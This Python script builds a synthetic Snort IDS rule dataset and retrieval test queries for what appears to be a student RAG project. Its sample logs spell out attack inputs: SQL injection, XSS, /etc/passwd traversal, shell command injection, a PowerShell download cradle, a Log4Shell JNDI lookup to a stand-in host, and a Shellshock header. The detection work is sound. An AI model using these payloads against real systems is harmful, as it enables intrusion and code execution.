from __future__ import annotations

import json
import random
from pathlib import Path
from typing import Dict, List

import pandas as pd

RANDOM_SEED = 42

ATTACK_TEMPLATES: List[Dict[str, object]] = [
    {
        "family": "Reconnaissance",
        "type": "TCP SYN Port Scan",
        "protocol": "tcp",
        "dst_ports": ["80", "443", "22", "21", "25"],
        "payloads": ["flags:S", "SYN probe", "many connection attempts"],
        "keywords": ["scan", "syn", "port", "reconnaissance", "nmap"],
        "severity": "medium",
        "risk": "medium",
        "mitre": "T1046 Network Service Discovery",
        "rule_options": 'flags:S; detection_filter:track by_src, count 20, seconds 10;',
        "description_templates": [
            "Detect repeated TCP SYN probes from an external host against a {service} service on port {port}.",
            "Identify a possible port scan where one source sends many SYN packets to {service} on port {port}.",
            "Generate a Snort rule for reconnaissance traffic targeting {service} with SYN flags."
        ],
        "log_templates": [
            "src=203.0.113.{n} dst=10.0.1.{m} proto=TCP dpt={port} flags=S count=34 window=1024",
            "IDS flow: repeated SYN packets from 198.51.100.{n} to 10.0.2.{m}:{port} in 10 seconds"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible TCP SYN scan against {service}"; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:{sid}; rev:1;)'
    },
    {
        "family": "Reconnaissance",
        "type": "ICMP Ping Sweep",
        "protocol": "icmp",
        "dst_ports": ["any"],
        "payloads": ["icmp echo", "ping sweep", "many hosts"],
        "keywords": ["icmp", "ping", "sweep", "reconnaissance", "echo"],
        "severity": "low",
        "risk": "medium",
        "mitre": "T1018 Remote System Discovery",
        "rule_options": 'itype:8; detection_filter:track by_src, count 30, seconds 20;',
        "description_templates": [
            "Detect an ICMP ping sweep where one source probes many internal hosts.",
            "Create a rule for excessive ICMP echo requests from the same external IP.",
            "Identify reconnaissance based on repeated ICMP echo traffic."
        ],
        "log_templates": [
            "src=203.0.113.{n} dst=10.0.{m}.0/24 proto=ICMP type=8 count=52",
            "Firewall log: ICMP echo requests to multiple hosts from 198.51.100.{n}"
        ],
        "rule_template": 'alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"Possible ICMP ping sweep"; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:{sid}; rev:1;)'
    },
    {
        "family": "DoS_DDoS",
        "type": "TCP SYN Flood",
        "protocol": "tcp",
        "dst_ports": ["80", "443", "8080"],
        "payloads": ["flags:S", "high syn rate", "half-open"],
        "keywords": ["syn flood", "dos", "ddos", "tcp", "web"],
        "severity": "high",
        "risk": "medium",
        "mitre": "T1498 Network Denial of Service",
        "rule_options": 'flags:S; detection_filter:track by_dst, count 200, seconds 5;',
        "description_templates": [
            "Detect a TCP SYN flood targeting the {service} service on port {port}.",
            "Generate a rule for abnormal SYN volume against a public {service} server.",
            "Identify denial-of-service behavior with many SYN packets to port {port}."
        ],
        "log_templates": [
            "src=multiple dst=10.0.1.{m} proto=TCP dpt={port} flags=S count=900 in=5s",
            "Netflow anomaly: high half-open TCP SYN rate to 10.0.2.{m}:{port}"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible TCP SYN flood against {service}"; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:{sid}; rev:1;)'
    },
    {
        "family": "DoS_DDoS",
        "type": "UDP Flood",
        "protocol": "udp",
        "dst_ports": ["53", "123", "1900", "500"],
        "payloads": ["high udp rate", "large packets", "many sources"],
        "keywords": ["udp", "flood", "dos", "amplification"],
        "severity": "high",
        "risk": "medium",
        "mitre": "T1498 Network Denial of Service",
        "rule_options": 'detection_filter:track by_dst, count 300, seconds 10;',
        "description_templates": [
            "Detect a UDP flood targeting port {port} on an internal server.",
            "Create a Snort rule for excessive UDP packets sent to {service}.",
            "Identify possible UDP denial-of-service traffic on port {port}."
        ],
        "log_templates": [
            "src=multiple dst=10.0.3.{m} proto=UDP dpt={port} count=1250 bytes=large",
            "Collector: UDP packets to 10.0.4.{m}:{port} exceed baseline by 800%"
        ],
        "rule_template": 'alert udp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible UDP flood on {service}"; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:{sid}; rev:1;)'
    },
    {
        "family": "Web_Attack",
        "type": "SQL Injection",
        "protocol": "tcp",
        "dst_ports": ["80", "443", "8080"],
        "payloads": ["' OR '1'='1", "UNION SELECT", "sqlmap"],
        "keywords": ["sql injection", "sqli", "union", "select", "web"],
        "severity": "high",
        "risk": "low",
        "mitre": "T1190 Exploit Public-Facing Application",
        "rule_options": 'flow:to_server,established; content:"UNION"; nocase; http_uri; content:"SELECT"; nocase; http_uri;',
        "description_templates": [
            "Detect SQL injection attempts using UNION SELECT in HTTP URI.",
            "Generate a Snort rule for a web request containing SQL injection keywords.",
            "Identify malicious HTTP traffic with UNION SELECT payloads against {service}."
        ],
        "log_templates": [
            "GET /product?id=1 UNION SELECT username,password FROM users HTTP/1.1 host=shop.local",
            "HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.{n}"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible SQL injection UNION SELECT attempt"; flow:to_server,established; content:"UNION"; nocase; http_uri; content:"SELECT"; nocase; http_uri; classtype:web-application-attack; sid:{sid}; rev:1;)'
    },
    {
        "family": "Web_Attack",
        "type": "Cross Site Scripting",
        "protocol": "tcp",
        "dst_ports": ["80", "443", "8080"],
        "payloads": ["<script>", "javascript:", "onerror="],
        "keywords": ["xss", "script", "javascript", "web"],
        "severity": "medium",
        "risk": "medium",
        "mitre": "T1189 Drive-by Compromise",
        "rule_options": 'flow:to_server,established; content:"<script"; nocase; http_uri;',
        "description_templates": [
            "Detect reflected XSS attempts containing script tags in HTTP requests.",
            "Create a rule for HTTP URI containing encoded or clear script payloads.",
            "Identify cross-site scripting attempts against the {service} application."
        ],
        "log_templates": [
            "GET /search?q=<script>alert(1)</script> HTTP/1.1 host=portal.local",
            "HTTP request uri=/comment?msg=%3Cscript%3Ealert(1)%3C/script%3E src=198.51.100.{n}"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible reflected XSS script tag"; flow:to_server,established; content:"<script"; nocase; http_uri; classtype:web-application-attack; sid:{sid}; rev:1;)'
    },
    {
        "family": "Web_Attack",
        "type": "Directory Traversal",
        "protocol": "tcp",
        "dst_ports": ["80", "443", "8080"],
        "payloads": ["../", "..%2f", "/etc/passwd"],
        "keywords": ["directory traversal", "path traversal", "etc passwd", "web"],
        "severity": "high",
        "risk": "low",
        "mitre": "T1190 Exploit Public-Facing Application",
        "rule_options": 'flow:to_server,established; content:"../"; http_uri;',
        "description_templates": [
            "Detect directory traversal attempts using ../ sequences in HTTP URI.",
            "Generate a Snort rule for path traversal targeting sensitive files.",
            "Identify web requests trying to access parent directories."
        ],
        "log_templates": [
            "GET /download?file=../../../../etc/passwd HTTP/1.1 host=app.local",
            "HTTP URI contains /static/..%2f..%2fetc%2fpasswd from 203.0.113.{n}"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible directory traversal attempt"; flow:to_server,established; content:"../"; http_uri; classtype:web-application-attack; sid:{sid}; rev:1;)'
    },
    {
        "family": "Web_Attack",
        "type": "Command Injection",
        "protocol": "tcp",
        "dst_ports": ["80", "443", "8080"],
        "payloads": [";cat /etc/passwd", "|whoami", "&& id"],
        "keywords": ["command injection", "whoami", "cat", "shell", "web"],
        "severity": "critical",
        "risk": "medium",
        "mitre": "T1059 Command and Scripting Interpreter",
        "rule_options": 'flow:to_server,established; pcre:"/(;|\\||&&)(whoami|id|cat)/Ui";',
        "description_templates": [
            "Detect command injection in HTTP parameters using shell separators.",
            "Create a Snort rule for web requests containing whoami or id after command separators.",
            "Identify HTTP command injection payloads against {service}."
        ],
        "log_templates": [
            "GET /ping?host=127.0.0.1;whoami HTTP/1.1 src=198.51.100.{n}",
            "POST /tools/check body=ip=8.8.8.8|id from 203.0.113.{n}"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible HTTP command injection"; flow:to_server,established; pcre:"/(;|\\||&&)(whoami|id|cat)/Ui"; classtype:web-application-attack; sid:{sid}; rev:1;)'
    },
    {
        "family": "Brute_Force",
        "type": "SSH Brute Force",
        "protocol": "tcp",
        "dst_ports": ["22"],
        "payloads": ["many failed ssh logins", "auth failure", "repeated attempts"],
        "keywords": ["ssh", "brute force", "login", "authentication"],
        "severity": "high",
        "risk": "medium",
        "mitre": "T1110 Brute Force",
        "rule_options": 'flow:to_server,established; detection_filter:track by_src, count 15, seconds 60;',
        "description_templates": [
            "Detect repeated SSH connection attempts that may indicate brute force.",
            "Generate a rule for excessive SSH login attempts from the same source.",
            "Identify suspicious SSH authentication activity on port 22."
        ],
        "log_templates": [
            "sshd: Failed password for invalid user admin from 203.0.113.{n} port 51422 repeated=18",
            "tcp flow src=198.51.100.{n} dst=10.0.5.{m}:22 sessions=25 in 60s"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"Possible SSH brute force attempts"; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:{sid}; rev:1;)'
    },
    {
        "family": "Brute_Force",
        "type": "FTP Brute Force",
        "protocol": "tcp",
        "dst_ports": ["21"],
        "payloads": ["USER", "PASS", "failed login"],
        "keywords": ["ftp", "brute force", "user", "pass"],
        "severity": "medium",
        "risk": "medium",
        "mitre": "T1110 Brute Force",
        "rule_options": 'flow:to_server,established; content:"USER"; nocase; detection_filter:track by_src, count 20, seconds 60;',
        "description_templates": [
            "Detect repeated FTP USER commands that may indicate brute force.",
            "Create a rule for many FTP login attempts on port 21.",
            "Identify FTP authentication guessing from one external source."
        ],
        "log_templates": [
            "ftp auth failed user=admin src=203.0.113.{n} dst=10.0.5.{m} attempts=31",
            "FTP control channel contains repeated USER commands from 198.51.100.{n}"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:"Possible FTP brute force USER attempts"; flow:to_server,established; content:"USER"; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:{sid}; rev:1;)'
    },
    {
        "family": "Malware_C2",
        "type": "HTTP C2 Beacon",
        "protocol": "tcp",
        "dst_ports": ["80", "443", "8080"],
        "payloads": ["beacon", "periodic", "User-Agent"],
        "keywords": ["c2", "beacon", "malware", "http", "periodic"],
        "severity": "critical",
        "risk": "medium",
        "mitre": "T1071.001 Web Protocols",
        "rule_options": 'flow:to_server,established; content:"User-Agent|3a| Mozilla/4.0"; http_header; detection_filter:track by_src, count 10, seconds 300;',
        "description_templates": [
            "Detect periodic HTTP beaconing using an old suspicious User-Agent header.",
            "Generate a rule for possible malware C2 HTTP beacon traffic.",
            "Identify repeated outbound HTTP requests that look like command-and-control."
        ],
        "log_templates": [
            "HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.{m} dst=198.51.100.{n}",
            "Proxy log: repeated small HTTP requests with fixed interval from host 10.0.6.{m}"
        ],
        "rule_template": 'alert tcp $HOME_NET any -> $EXTERNAL_NET {port} (msg:"Possible HTTP C2 beacon with suspicious User-Agent"; flow:to_server,established; content:"User-Agent|3a| Mozilla/4.0"; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:{sid}; rev:1;)'
    },
    {
        "family": "Malware_C2",
        "type": "PowerShell Download Cradle",
        "protocol": "tcp",
        "dst_ports": ["80", "443"],
        "payloads": ["powershell", "DownloadString", "Invoke-Expression"],
        "keywords": ["powershell", "download", "malware", "payload", "c2"],
        "severity": "critical",
        "risk": "low",
        "mitre": "T1059.001 PowerShell",
        "rule_options": 'flow:to_server,established; content:"powershell"; nocase; content:"DownloadString"; nocase;',
        "description_templates": [
            "Detect HTTP traffic carrying PowerShell DownloadString payloads.",
            "Create a rule for suspicious PowerShell download cradle content.",
            "Identify malware staging using powershell and DownloadString keywords."
        ],
        "log_templates": [
            "POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.{m}",
            "HTTP payload contains powershell DownloadString from 10.0.7.{m} to 203.0.113.{n}"
        ],
        "rule_template": 'alert tcp $HOME_NET any -> $EXTERNAL_NET {port} (msg:"Possible PowerShell download cradle"; flow:to_server,established; content:"powershell"; nocase; content:"DownloadString"; nocase; classtype:trojan-activity; sid:{sid}; rev:1;)'
    },
    {
        "family": "DNS_Attack",
        "type": "DNS Tunneling",
        "protocol": "udp",
        "dst_ports": ["53"],
        "payloads": ["long domain", "TXT query", "base64-like"],
        "keywords": ["dns", "tunneling", "long subdomain", "txt", "exfiltration"],
        "severity": "high",
        "risk": "medium",
        "mitre": "T1071.004 DNS",
        "rule_options": 'content:"|00 10|"; offset:2; detection_filter:track by_src, count 25, seconds 60;',
        "description_templates": [
            "Detect repeated DNS TXT queries with long encoded-looking subdomains.",
            "Generate a rule for suspected DNS tunneling over port 53.",
            "Identify DNS exfiltration behavior using many TXT requests."
        ],
        "log_templates": [
            "DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.{m} count=47",
            "Resolver log: many long subdomain TXT queries from host 10.0.8.{m}"
        ],
        "rule_template": 'alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:"Possible DNS tunneling via TXT queries"; content:"|00 10|"; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:{sid}; rev:1;)'
    },
    {
        "family": "DNS_Attack",
        "type": "DNS Amplification",
        "protocol": "udp",
        "dst_ports": ["53"],
        "payloads": ["ANY query", "large response", "amplification"],
        "keywords": ["dns", "amplification", "any", "dos"],
        "severity": "high",
        "risk": "medium",
        "mitre": "T1498 Network Denial of Service",
        "rule_options": 'content:"|00 FF|"; offset:2; detection_filter:track by_src, count 40, seconds 20;',
        "description_templates": [
            "Detect many DNS ANY queries that may be used for amplification.",
            "Create a rule for DNS amplification attempts using query type ANY.",
            "Identify suspicious high-rate DNS ANY requests."
        ],
        "log_templates": [
            "DNS query type=ANY domain=example.org src=203.0.113.{n} count=89",
            "UDP/53 ANY requests from one source exceed threshold"
        ],
        "rule_template": 'alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:"Possible DNS amplification ANY query abuse"; content:"|00 FF|"; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:{sid}; rev:1;)'
    },
    {
        "family": "Exploitation",
        "type": "Log4Shell JNDI Pattern",
        "protocol": "tcp",
        "dst_ports": ["80", "443", "8080", "8443"],
        "payloads": ["${jndi:", "ldap://", "rmi://"],
        "keywords": ["log4j", "jndi", "ldap", "exploit", "web"],
        "severity": "critical",
        "risk": "low",
        "mitre": "T1190 Exploit Public-Facing Application",
        "rule_options": 'flow:to_server,established; content:"${jndi:"; nocase;',
        "description_templates": [
            "Detect Log4Shell exploitation attempts containing JNDI lookup strings.",
            "Generate a Snort rule for HTTP payloads with ${{jndi: patterns.",
            "Identify possible Log4j exploit traffic using jndi ldap indicators."
        ],
        "log_templates": [
            "GET /?q=${{jndi:ldap://malicious.example/a}} HTTP/1.1 user-agent=probe",
            "HTTP header X-Api-Version contains ${{jndi:ldap://203.0.113.{n}/x}}"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible Log4Shell JNDI exploit attempt"; flow:to_server,established; content:"${{jndi:"; nocase; classtype:web-application-attack; sid:{sid}; rev:1;)'
    },
    {
        "family": "Exploitation",
        "type": "Shellshock CGI Pattern",
        "protocol": "tcp",
        "dst_ports": ["80", "443"],
        "payloads": ["() {", ":;};", "/bin/bash"],
        "keywords": ["shellshock", "cgi", "bash", "exploit", "web"],
        "severity": "critical",
        "risk": "low",
        "mitre": "T1190 Exploit Public-Facing Application",
        "rule_options": 'flow:to_server,established; content:"() {{"; http_header;',
        "description_templates": [
            "Detect Shellshock exploitation attempts in HTTP headers.",
            "Create a Snort rule for CGI Bash function injection patterns.",
            "Identify HTTP requests containing the Shellshock () {{ pattern."
        ],
        "log_templates": [
            "User-Agent: () {{ :;}}; /bin/bash -c 'id' src=198.51.100.{n}",
            "HTTP header contains Bash function pattern targeting /cgi-bin/status"
        ],
        "rule_template": 'alert tcp $EXTERNAL_NET any -> $HOME_NET {port} (msg:"Possible Shellshock CGI exploit attempt"; flow:to_server,established; content:"() {{"; http_header; classtype:web-application-attack; sid:{sid}; rev:1;)'
    },
    {
        "family": "Policy_Violation",
        "type": "Cleartext Password Exposure",
        "protocol": "tcp",
        "dst_ports": ["80", "21", "110", "143"],
        "payloads": ["password=", "PASS ", "pwd="],
        "keywords": ["cleartext", "password", "credentials", "policy"],
        "severity": "medium",
        "risk": "medium",
        "mitre": "T1552 Unsecured Credentials",
        "rule_options": 'flow:to_server,established; pcre:"/(password=|pwd=|PASS\\s+)/Ui";',
        "description_templates": [
            "Detect possible cleartext password exposure in unencrypted traffic.",
            "Generate a policy rule for credentials sent over cleartext protocol {service}.",
            "Identify HTTP or legacy protocol requests leaking password parameters."
        ],
        "log_templates": [
            "POST /login body=username=alice&password=Summer2026 src=10.0.9.{m}",
            "FTP command PASS ******** observed from 10.0.9.{m} to server"
        ],
        "rule_template": 'alert tcp $HOME_NET any -> $EXTERNAL_NET {port} (msg:"Possible cleartext password exposure"; flow:to_server,established; pcre:"/(password=|pwd=|PASS\\s+)/Ui"; classtype:policy-violation; sid:{sid}; rev:1;)'
    },
]

SERVICE_BY_PORT = {
    "80": "HTTP",
    "443": "HTTPS",
    "8080": "HTTP-alt",
    "8443": "HTTPS-alt",
    "22": "SSH",
    "21": "FTP",
    "25": "SMTP",
    "53": "DNS",
    "123": "NTP",
    "1900": "SSDP",
    "500": "IKE",
    "110": "POP3",
    "143": "IMAP",
    "any": "generic network"
}

DESCRIPTION_STYLES = [
    "formal", "technical", "short", "incident_ticket", "analyst_request"
]


def _style_description(base: str, style: str, family: str, attack_type: str) -> str:
    if style == "formal":
        return base
    if style == "technical":
        return f"Need IDS detection logic for {attack_type}: {base} Include protocol and threshold constraints."
    if style == "short":
        return f"Rule for {attack_type.lower()} on the network."
    if style == "incident_ticket":
        return f"SOC ticket: suspicious {family} activity observed. {base}"
    if style == "analyst_request":
        return f"As a security analyst, I want to detect this behavior: {base}"
    return base


def generate_dataset(n_rows: int = 160, seed: int = RANDOM_SEED) -> pd.DataFrame:
    rng = random.Random(seed)
    rows = []
    sid_base = 1000000
    for i in range(n_rows):
        tpl = ATTACK_TEMPLATES[i % len(ATTACK_TEMPLATES)]
        port = rng.choice(tpl["dst_ports"])
        service = SERVICE_BY_PORT.get(port, "service")
        sid = sid_base + i + 1
        desc_template = rng.choice(tpl["description_templates"])
        base_desc = desc_template.format(port=port, service=service)
        style = rng.choice(DESCRIPTION_STYLES)
        description = _style_description(base_desc, style, tpl["family"], tpl["type"])
        log_template = rng.choice(tpl["log_templates"])
        log_excerpt = log_template.format(port=port, service=service, n=rng.randint(10, 240), m=rng.randint(2, 250))
        payload = rng.choice(tpl["payloads"])
        rule = tpl["rule_template"].format(port=port, service=service, sid=sid)
        explanation = (
            f"This Snort rule is designed for {tpl['type']} in the {tpl['family']} family. "
            f"It monitors {tpl['protocol'].upper()} traffic on destination port {port} ({service}) and uses indicators such as {payload}. "
            f"The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable."
        )
        rows.append({
            "doc_id": f"SNORT_{i+1:04d}",
            "attack_description": description,
            "description_style": style,
            "attack_family": tpl["family"],
            "attack_type": tpl["type"],
            "protocol": tpl["protocol"],
            "source_zone": "$EXTERNAL_NET" if tpl["family"] not in ["Malware_C2", "Policy_Violation", "DNS_Attack"] else "$HOME_NET",
            "destination_zone": "$HOME_NET" if tpl["family"] not in ["Malware_C2", "Policy_Violation", "DNS_Attack"] else "$EXTERNAL_NET",
            "source_port": "any",
            "destination_port": port,
            "service": service,
            "payload_pattern": payload,
            "log_excerpt": log_excerpt,
            "expected_snort_rule": rule,
            "rule_explanation": explanation,
            "severity": tpl["severity"],
            "false_positive_risk": tpl["risk"],
            "mitre_technique": tpl["mitre"],
            "keywords": ", ".join(tpl["keywords"]),
            "synthetic_generation_method": "manual template + controlled random variations",
            "needs_retrieval": True
        })
    df = pd.DataFrame(rows)
    return df


def generate_test_queries(df: pd.DataFrame, n_queries: int = 32, seed: int = RANDOM_SEED) -> pd.DataFrame:
    rng = random.Random(seed + 100)
    sample = df.sample(n=min(n_queries, len(df)), random_state=seed + 3).reset_index(drop=True)
    query_variants = []
    prefixes = [
        "Generate a Snort rule to ",
        "I need detection for ",
        "How can we detect ",
        "Create an IDS signature for ",
        "Write a Snort rule for "
    ]
    for idx, row in sample.iterrows():
        q = row["attack_description"]
        if rng.random() < 0.7:
            q = rng.choice(prefixes) + q[0].lower() + q[1:]
        if rng.random() < 0.35:
            q += f" Observed log: {row['log_excerpt']}"
        query_variants.append({
            "query_id": f"Q_{idx+1:03d}",
            "query": q,
            "expected_doc_id": row["doc_id"],
            "expected_attack_family": row["attack_family"],
            "expected_attack_type": row["attack_type"],
            "expected_protocol": row["protocol"],
            "expected_destination_port": row["destination_port"],
            "expected_rule": row["expected_snort_rule"],
            "needs_retrieval": True
        })
    return pd.DataFrame(query_variants)


def save_dataset(base_dir: str | Path = "data", n_rows: int = 160, n_queries: int = 32) -> None:
    base = Path(base_dir)
    base.mkdir(parents=True, exist_ok=True)
    df = generate_dataset(n_rows=n_rows)
    queries = generate_test_queries(df, n_queries=n_queries)
    df.to_csv(base / "snort_knowledge_base.csv", index=False)
    queries.to_csv(base / "snort_test_queries.csv", index=False)
    df.to_json(base / "snort_knowledge_base.json", orient="records", indent=2)
    queries.to_json(base / "snort_test_queries.json", orient="records", indent=2)
    metadata = {
        "project": "Devoir 3 - SNORT RAG",
        "dataset_type": "personal synthetic dataset",
        "n_documents": int(len(df)),
        "n_test_queries": int(len(queries)),
        "families": sorted(df["attack_family"].unique().tolist()),
        "generation_method": "manual cybersecurity templates enriched by controlled synthetic variations",
        "note": "No Kaggle/GitHub/public ready-made labeled dataset was used."
    }
    (base / "dataset_metadata.json").write_text(json.dumps(metadata, indent=2), encoding="utf-8")


if __name__ == "__main__":
    save_dataset()
